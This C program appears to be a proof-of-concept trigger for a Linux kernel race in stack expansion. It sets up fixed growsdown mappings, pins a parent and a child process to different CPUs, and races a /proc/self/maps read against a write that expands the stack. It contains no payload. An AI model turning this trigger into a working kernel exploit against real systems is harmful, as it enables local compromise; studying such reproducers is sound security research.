#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <assert.h>
#include <errno.h>

#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#define CPU_0 0
#define CPU_1 1

static int pin_cpu2(pid_t pid, int cpu_id) {
	unsigned long cpu_mask = 1UL << cpu_id;
	return syscall(__NR_sched_setaffinity, pid, sizeof(cpu_mask), &cpu_mask);
}
static int pin_cpu(int cpu_id) {
	return pin_cpu2(getpid(), cpu_id);
}

#define L_ERROR "\x1B[31m"
#define L_DOING "\x1B[0m"
#define L_DONE	"\x1B[32m"
#define A_SUCC	"\\x1B[35m"
#define A_RESET "\\x1B[0m"

#define PAGE_SIZE	0x1000UL
#define PAGE_MASK	0x0fffUL
#define PAGE_ALIGN(val) (((val) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1))

#define ADDR_VICTIM ((void *)0x80000UL)
#define SIZE_VICTIM PAGE_SIZE

#define ADDR_GAP    (ADDR_VICTIM - SIZE_GAP)
#define SIZE_GAP    PAGE_SIZE

#define ADDR_GUARD  (ADDR_GAP - SIZE_GUARD)
#define SIZE_GUARD  PAGE_SIZE

static int setup_maps(void) {
	void * addr;
	addr = mmap(ADDR_VICTIM, SIZE_VICTIM, PROT_READ | PROT_WRITE,
		    MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED) {
		perror(L_ERROR
		       "[-] Cannot map upper pages for stack expansion");
		return -1;
	}
	addr = mmap(ADDR_GUARD, SIZE_GUARD,
		    PROT_READ | PROT_WRITE | MAP_EXECUTABLE,
		    MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED) {
		perror(L_ERROR
		       "[-] Cannot map lower pages for stack expansion");
		return -1;
	}
	return 0;
}
static void reset_maps(void) {
    char * ptr = (char *)(ADDR_GAP + 1);
    printf("try write to %#lx\n", (uintptr_t)ptr);
    *ptr = 'a';
    printf("write to %#lx OK\n", (uintptr_t)ptr);
	// int retval = munmap(ADDR_GAP, SIZE_GAP);
    // printf("munmap(%#lx, size=%#lx) ret=%d\n", ADDR_GAP, SIZE_GAP, retval);
}

#define BUFSZ_PROCMAPS 1024
static char buf_procmaps[BUFSZ_PROCMAPS];

sigset_t sigset;

void do_read_procmaps(void) {
    // open file
    int fd_procmaps = open("/proc/self/maps", O_RDONLY);
	if (fd_procmaps < 0) {
		perror(L_ERROR "[-] Cannot open \"/proc/self/maps\"");
		exit(-1);
	}
    // read file (should breakpoint on the second vma)
	int retval = read(fd_procmaps, buf_procmaps, BUFSZ_PROCMAPS - 1);
	if (retval < 0) {
		perror(L_ERROR "[-] Cannot read from \"/proc/self/maps\" (initialize the kernel buffer)");
		exit(-1);
	}
    buf_procmaps[retval] = '\0';
    puts(buf_procmaps);
    // return
    close(fd_procmaps);
    exit(EXIT_SUCCESS);
}

int main(void) {

	if (pin_cpu(CPU_0) < 0) {
		perror(L_ERROR "[-] Cannot pin to the first CPU");
		exit(-1);
	}

    // sigemptyset(&sigset);
    // sigaddset(&sigset, SIGUSR1);

    setup_maps();

    // for gdb breakpoint
    printf("#1 sid;\n");
    int sid1 = getsid(getpid());
    printf("#1 sid = %d\n", sid1);

    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        // // wait until SIGUSR1 received
        // int sig;
        // sigwait(&sigset, &sig);
        if (pin_cpu(CPU_1) < 0) {
            perror(L_ERROR "[-] Cannot pin the subprocess to the second CPU");
            exit(-1);
        }
        do_read_procmaps();
    }

    // kill(pid, SIGUSR1);

    // try to trigger expand_downwards()
    reset_maps();

    // for gdb breakpoint
    printf("#2 sid;\n");
    int sid = getsid(getpid());
    printf("#2 sid = %d\n", sid);

    //
    wait(NULL);
    return 0;
}
